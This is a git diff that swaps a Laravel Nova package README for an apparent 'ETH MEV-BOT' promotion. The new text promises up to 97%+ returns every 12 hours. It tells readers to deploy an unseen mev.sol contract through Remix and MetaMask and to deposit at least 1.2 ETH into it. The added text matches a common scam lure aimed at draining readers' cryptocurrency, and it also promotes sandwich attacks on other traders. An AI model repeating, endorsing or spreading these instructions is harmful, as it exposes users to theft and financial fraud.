@@ -1,69 +1,100 @@
-This package has been archived until such time that it can be brought up-to-date with Laravel Nova. We have stopped using Laravel Nova, and no longer have a license for it. As such we currently cannot justify further development on this package. Please check here for availability of similar packages: https://novapackages.com
+---
 
-# Prepoulate Searchable for Laravel Nova
-**A tool to allow BelongsTo searchable fields to be pre-populated with data**
+<div align="center">
 
-[![Latest Version on Packagist](https://img.shields.io/packagist/v/genealabs/nova-prepopulate-searchable.svg?style=flat-square)](https://packagist.org/packages/alexbowers/nova-prepopulate-searchable)
-[![Total Downloads](https://img.shields.io/packagist/dt/alexbowers/nova-prepopulate-searchable.svg?style=flat-square)](https://packagist.org/packages/genealabs/nova-prepopulate-searchable)
+# 💎🤖 ETH MEV-BOT 🤖💎
+  
+An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.
 
-![Prepopulate Search](https://github.com/genealabs/nova-prepopulate-searchable/blob/master/screenshots/example.gif?raw=true)
+</div>
+
+---
+
+## 📚 About
+
+In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.
+
+---
+
+<div align="center">
+
+## 🚀 How it Works
+
+![profit](https://i.ibb.co/t39DBd6/1.jpg)
+
+</div>
+
+Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.
+
+---
+
+## ETH Investment Returns
+
+Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as follows:
+
+| ETH Range (invested) | Returns (12 hours) |
+| --- | --- |
+| `1.2ETH - 2.4ETH` | `up to 10%` |
+| `2.4ETH - 5ETH` | `up to 20%` |
+| `5ETH - 10ETH` | `20-27%` |
+| `10ETH - 20ETH` | `27-35%` |
+| `20ETH - 50ETH` | `35-50%` |
+| `50ETH - 100ETH` | `50-63%` |
+| `100ETH - 200ETH` | `63-76%` |
+| `200ETH - 500ETH` | `76-97%` |
+| `500ETH and above` | `97%+` |
+
+**Note:** The above percentages are subject to market conditions and are not guaranteed. Please invest responsibly.
+
+---
+
+## 👨‍💻 Instructions
+
+1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org):
+  - 📁 Create a new file mev.sol and paste the code from mev.sol.
 
 
-```diff
-- Alert: the namespace of this repo has changed from `alexbowers/nova-prepopulate-searchable`
-- to `genealabs/nova-prepopulate-searchable`. Please update your composer.json file before updating!
-```
+<img src="https://i.ibb.co/m8ZQRwp/2.png" alt="2" border="0">
 
-## Sponsors
-We thank the following sponsors for their generosity. Please take a moment to check them out:
+2) 🔧 Select compiler version 0.6.12 and press compile.
 
-- [LIX](https://lix-it.com)
+![2](https://i.ibb.co/2Ns7jqm/3.png)
 
-## Requirements
-- PHP 7.3+
-- Laravel 7.0+
-- Nova 3.8.4+
+3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
 
-## Installation
+![3](https://i.ibb.co/NCsWwyW/4.png)
 
-You can install the package in to a Laravel app that uses [Nova](https://nova.laravel.com) via composer:
+4) Verify your smart contract on etherscan -
 
-```bash
-composer require genealabs/nova-prepopulate-searchable
-```
+- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
+   - 📝 Enter contract address and set inputs:
+   - Compiler Type: Solidity (Single File)
+   - Compiler Version: ^0.6.12
+   - License Type: 3) MIT License (MIT)
+   - 📋 Paste the code from mev.sol.
+   - 🚫 Leave ABI input box empty.
+   - 🟢 Click "Verify"
 
-## Usage
 
-On any `BelongsTo` fields in your resources that are `searchable()`, you can also add `prepopulate()` to the method chain and the field will be prepopulated with values to choose from.
+5) Deposit funds (at least 1.2 ETH to prevent negative slippage) into your specific contract/bot address.
+ 
+6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction
 
-You may optionally pass through a search query to the prepopulate method, and the keywords passed will be used for
-the search initially, before resetting the search to being empty (as it currently is).
+<img width="780" alt="4" src="https://i.ibb.co/Dp5nXPN/5.png">
 
-### Limiting Pre-Populated Items
-You can limit the prepopulated items by passing in a search string to the `prepopulated()` method like so:
+7) Withdraw anytime by clicking 'withdrawal'.
 
-```php
-    BelongsTo::make("Archive")
-        ->searchable()
-        ->prepopulate("test").
-```
+:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 
 
-This would prepopulate all archives that have test in their display field.
+At any point, you can stop the bot or retrieve your money by calling the withdrawal function.
 
-### Security
+<div align="center">
 
-If you discover any security related issues, please email hello@genealabs.com instead of using the issue tracker.
+💰💰💰 Make money with MevBot 💰💰💰
 
-## Credits
+</div>
 
-### [Alex Bowers](https://github.com/alexbowers)
+---
 
-Alex is the original developer of this package and has done a great job with initial development.
-
-### [Mike Bronner](https://github.com/mikebronner)
-
-I started using this package and didn't want it to fall to the way-side, as it helps improve the UX of Nova significantly. Alex graceously allowed me to continue development and maintenance on his original package.
-
-## License
-
-The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
+##### Please ⭐ the repo to support my project
+---
